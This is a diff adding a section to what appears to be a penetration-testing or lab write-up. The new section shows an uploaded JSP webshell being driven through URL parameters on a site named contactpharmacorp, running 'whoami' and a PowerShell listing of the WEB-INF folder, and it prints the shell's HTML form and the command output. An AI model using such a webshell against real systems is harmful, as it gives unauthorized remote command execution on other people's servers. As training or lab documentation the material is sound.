@@ -114,3 +114,42 @@ X-Powered-By: ASP.NET
 
 uploaded
 ```
+Using webshell:
+
+```
+view-source:https://contactpharmacorp.azurewebsites.net/studentx.jsp?cmd=whoami
+
+
+<HTML>
+<BODY>
+<H3>JSP SHELL</H3>
+<FORM METHOD="GET" NAME="myform"
+ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Execute">
+</FORM>
+<PRE>
+Command: whoami<BR>
+iis apppool\contactpharmacorp
+
+</PRE>
+</BODY>
+</HTML>
+
+```
+view-source:https://contactpharmacorp.azurewebsites.net/studentx.jsp?cmd=powershell%20-c%20"ls%20webapps/ROOT/WEB-INF/"
+```
+Command: powershell -c "ls webapps/ROOT/WEB-INF"<BR>
+
+
+    Directory: C:\home\site\wwwroot\webapps\ROOT\WEB-INF
+
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+d-----        10/3/2023  12:08 PM                classes                       
+d-----        10/3/2023  12:08 PM                lib                           
+-a----         6/3/2022  11:54 AM            362 appengine-web.xml             
+-a----         6/3/2022  11:54 AM            139 logging.properties            
+------        10/3/2023  12:08 PM            751 web.xml  
+```
